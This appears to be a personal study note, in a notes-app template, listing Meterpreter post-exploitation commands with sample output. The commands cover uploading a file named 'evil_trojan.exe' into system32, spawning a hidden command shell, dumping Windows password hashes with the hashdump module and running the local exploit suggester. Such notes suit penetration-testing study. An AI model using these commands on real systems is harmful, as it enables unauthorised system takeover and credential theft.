---
creation date: December 19th 2022
last modified date: December 19th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[meterpreter]]  
___

## Description:  

### useful commands

```
meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM

meterpreter >

meterpreter > download c:\\boot.ini

[*] downloading: c:\boot.ini -> c:\boot.ini

[*] downloaded : c:\boot.ini -> c:\boot.ini/boot.ini

meterpreter >

meterpreter > upload evil_trojan.exe c:\\windows\\system32

[*] uploading  : evil_trojan.exe -> c:\windows\system32

[*] uploaded   : evil_trojan.exe -> c:\windows\system32\evil_trojan.exe

meterpreter >

meterpreter > cat

Usage: cat file

meterpreter > edit edit.txt

meterpreter > search -f autoexec.bat

Found 1 result...

    c:\AUTOEXEC.BAT

meterpreter > execute -f cmd.exe -i -H

Process 38320 created.

Channel 1 created.

Microsoft Windows XP [Version 5.1.2600]

(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>

```
### hashdump

```
meterpreter > run post/windows/gather/hashdump

shell to drop into a shell and exit to get back into the meterpreter session

meterpreter > backgorund

use post/multi/recon/local_exploit_suggester

set session 1

```

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 19th 2022 (01:14 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
